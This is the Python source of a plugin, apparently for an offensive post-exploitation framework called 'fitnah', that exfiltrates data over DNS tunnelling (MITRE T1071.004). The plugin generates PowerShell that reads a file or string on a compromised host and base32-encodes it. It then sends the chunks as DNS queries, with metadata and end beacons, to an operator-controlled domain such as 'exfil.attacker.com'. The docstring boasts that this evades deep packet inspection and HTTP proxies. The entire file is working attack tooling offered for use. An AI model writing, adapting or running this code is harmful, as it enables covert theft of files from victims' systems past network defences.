"""
exfiltration/dns_tunnel — DNS tunneling data exfiltration. MITRE T1071.004.
Encodes data as base32 subdomains and sends it via DNS A/TXT queries.
Each chunk becomes a DNS query: <chunk>.seq<n>.exfil.<operator_domain>
The operator's authoritative DNS server logs all queries, reconstructing the data.
No direct TCP/HTTP connection to C2 — bypasses L7 DPI and HTTP proxies.
"""
from __future__ import annotations

import base64
import math
from pathlib import Path

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class DnsTunnel(BasePlugin):
    NAME        = "dns_tunnel"
    DESCRIPTION = "Exfiltrate data over DNS queries to an operator-controlled domain (T1071.004)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1071.004"
    CATEGORY    = "exfiltration"
    VERSION     = "1.0.0"

    schema = ParamSchema().add(
        Param("domain", str, required=True,
              help="Operator-controlled DNS domain (e.g. exfil.attacker.com)"),
        Param("data", str, required=False, default="",
              help="String data to exfiltrate (mutually exclusive with file_path)"),
        Param("file_path", str, required=False, default="",
              help="Remote file path on agent to exfiltrate"),
        Param("query_type", str, required=False, default="A",
              help="DNS query type: A | TXT"),
        Param("chunk_size", int, required=False, default=30,
              help="Bytes per DNS label (max 63; keep ≤30 for reliability)"),
        Param("delay_ms", int, required=False, default=500,
              help="Delay between queries in milliseconds"),
        Param("dns_server", str, required=False, default="",
              help="DNS server to query (blank = system default)"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        domain     = params.get("domain", "")
        data_str   = params.get("data", "")
        file_path  = params.get("file_path", "")
        qtype      = params.get("query_type", "A").upper()
        chunk_size = min(int(params.get("chunk_size", 30)), 50)
        delay_ms   = int(params.get("delay_ms", 500))
        dns_srv    = params.get("dns_server", "")

        if not domain:
            return ModuleResult.err("domain is required")
        if not data_str and not file_path:
            return ModuleResult.err("Provide data or file_path")

        ps = self._build_ps(domain, data_str, file_path, qtype, chunk_size, delay_ms, dns_srv)
        r  = ctx.ps(ps, timeout=300)
        if r["status"] != "ok":
            return ModuleResult.err(f"dns_tunnel failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="dns_tunnel")

    @staticmethod
    def _build_ps(domain: str, data_str: str, file_path: str,
                  qtype: str, chunk_size: int, delay_ms: int, dns_srv: str) -> str:

        # Data source block
        if file_path:
            data_block = f"$raw = [System.IO.File]::ReadAllBytes('{file_path}')"
        else:
            escaped = data_str.replace("'", "''")
            data_block = f"$raw = [System.Text.Encoding]::UTF8.GetBytes('{escaped}')"

        dns_query = (
            f"Resolve-DnsName -Name $fqdn -Type {qtype} -Server '{dns_srv}' -ErrorAction SilentlyContinue"
            if dns_srv else
            f"Resolve-DnsName -Name $fqdn -Type {qtype} -ErrorAction SilentlyContinue"
        )

        return f"""
$results = @("[*] DNS tunnel → {domain}")
try {{
    {data_block}
    # Base32 encode (A-Z2-7, no padding chars in labels)
    $b32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
    function ConvertTo-Base32($bytes) {{
        $out = [System.Text.StringBuilder]::new()
        $bits = 0; $buf = 0
        foreach ($b in $bytes) {{
            $buf = ($buf -shl 8) -bor $b; $bits += 8
            while ($bits -ge 5) {{
                $bits -= 5
                $out.Append($b32chars[($buf -shr $bits) -band 0x1F]) | Out-Null
            }}
        }}
        if ($bits -gt 0) {{ $out.Append($b32chars[($buf -shl (5 - $bits)) -band 0x1F]) | Out-Null }}
        return $out.ToString().ToLower()
    }}

    $encoded   = ConvertTo-Base32($raw)
    $chunkSize = {chunk_size}
    $total     = [Math]::Ceiling($encoded.Length / $chunkSize)
    $results  += "[+] Payload: $($raw.Length) bytes  encoded: $($encoded.Length) chars  chunks: $total"

    # Send metadata beacon: meta.<total>.<len>.<domain>
    $metaFqdn = "meta.$total.$($raw.Length).{domain}"
    {dns_query.replace('$fqdn', '$metaFqdn')} | Out-Null
    $results += "[+] Meta query sent: $metaFqdn"

    $sent = 0
    for ($i = 0; $i -lt $total; $i++) {{
        $chunk = $encoded.Substring($i * $chunkSize, [Math]::Min($chunkSize, $encoded.Length - $i * $chunkSize))
        $fqdn  = "$chunk.s$i.{domain}"
        {dns_query} | Out-Null
        $sent++
        if ({delay_ms} -gt 0) {{ Start-Sleep -Milliseconds {delay_ms} }}
    }}

    # End beacon
    $endFqdn = "end.$sent.{domain}"
    {dns_query.replace('$fqdn', '$endFqdn')} | Out-Null
    $results += "[+] Exfiltrated $sent/$total chunks via DNS {qtype} queries"
    $results += "[*] Reconstruct with: cat <dns_log> | grep '{domain}' | sort -k1 | decode"

}} catch {{ $results += "[-] $_" }}
$results -join "`n"
""".strip()
